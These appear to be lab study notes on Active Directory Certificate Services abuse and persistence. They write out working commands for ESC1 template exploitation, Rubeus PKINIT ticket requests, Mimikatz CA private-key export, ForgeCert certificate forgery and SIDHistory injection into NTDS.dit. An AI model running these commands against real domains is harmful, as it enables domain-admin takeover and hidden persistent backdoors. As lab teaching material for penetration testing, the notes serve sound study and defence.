# 07 — AD CS + Persistence

> [!NOTE]
> Active Directory Certificate Services (AD CS) provides PKI for authentication, encryption, and signatures. Misconfigured certificate templates present high-impact domain escalation and persistent backdoors.

---

## AD CS Terminology

- **CA:** Certificate Authority — issues and validates certificates
- **CSR:** Certificate Signing Request
- **EKU:** Extended Key Usage — defines valid uses (`Client Authentication`, `Smart Card Logon`, `Server Authentication`)
- **SAN:** Subject Alternative Name — allows specifying alternative identities (UPN/DNS)

---

## ESC1 — Vulnerable Certificate Template

A template is vulnerable to ESC1 if **all four conditions** are met:

1. **Client Authentication EKU** enabled
2. **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** enabled (requester controls SAN)
3. **Manager approval disabled**
4. **Low-privileged users** hold `Enroll` permissions

### Enumerate
```powershell
. C:\AD\Tools\PSPKIAudit.ps1
Invoke-PKIAudit
```
```cmd
Certify.exe find /vulnerable
```

---

## ESC1 Escalation Flow

1. Request Certificate for ESC1 Template with SAN = Administrator
2. CA issues Certificate (`.pfx`) with Administrator identity
3. AS-REQ with Certificate via PKINIT (`Rubeus asktgt`)
4. DC returns Administrator TGT + NTLM Hash / PAC Session Key
5. Pass-The-Ticket / Connect to DC as Domain Admin

---

## Certificate Request & PKINIT Authentication

### Request via MMC
1. `mmc.exe` → Add `Certificates` snap-in (Current User).
2. Personal → Certificates → Request New Certificate.
3. Select vulnerable template → Details → **SAN** → Add UPN: `Administrator@dcorp.moneycorp.local`.
4. Export with private key as `.pfx`.

### Rubeus PKINIT TGT
```cmd
Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:C:\AD\Tools\cert.pfx /password:P@ss123! /outfile:C:\AD\Tools\admin_tgt.kirbi /domain:dcorp.moneycorp.local /dc:dcorp-dc.dcorp.moneycorp.local /ptt
```

---

## CA Private Key Extraction & ForgeCert

If an attacker has admin on the CA server, they can export the CA private key and forge certificates offline for any identity.

### Export CA Key (Mimikatz)
```text
mimikatz # privilege::debug
mimikatz # crypto::certificates /systemstore:local_machine
mimikatz # crypto::capi
mimikatz # crypto::cng
mimikatz # crypto::certificates /systemstore:local_machine /export
```

### Forge Certificate (ForgeCert)
```cmd
ForgeCert.exe --CaCertPath C:\AD\Tools\ca.pfx --CaCertPassword P@ss123! --Subject "CN=Administrator" --SubjectAltName Administrator@dcorp.moneycorp.local --NewCertPath C:\AD\Tools\forged_admin.pfx --NewCertPassword P@ss123!
```

### Authenticate with Forged Certificate
```cmd
Rubeus.exe asktgt /user:Administrator /certificate:C:\AD\Tools\forged_admin.pfx /password:P@ss123! /ptt
```

---

## SIDHistory Persistence Injection

`SIDHistory` preserves access rights during domain migrations. Adding `Domain Admins` SID (`-512`) to a standard user's `SIDHistory` grants full DA privileges.

### Execution (Requires Offline NTDS.dit or DA Access)
```powershell
# Enumerate SIDs
Get-DomainUser student1 -Properties sidhistory,objectsid
Get-DomainGroup 'Domain Admins' -Properties objectsid

# Stop NTDS, patch SIDHistory, restart
Stop-Service -Name ntds -Force
Add-ADDBSidHistory -SamAccountName student1 -SidHistory 'S-1-5-21-3537233777-2717541362-1549646036-512' -DatabasePath C:\Windows\NTDS\ntds.dit
Start-Service -Name ntds
```
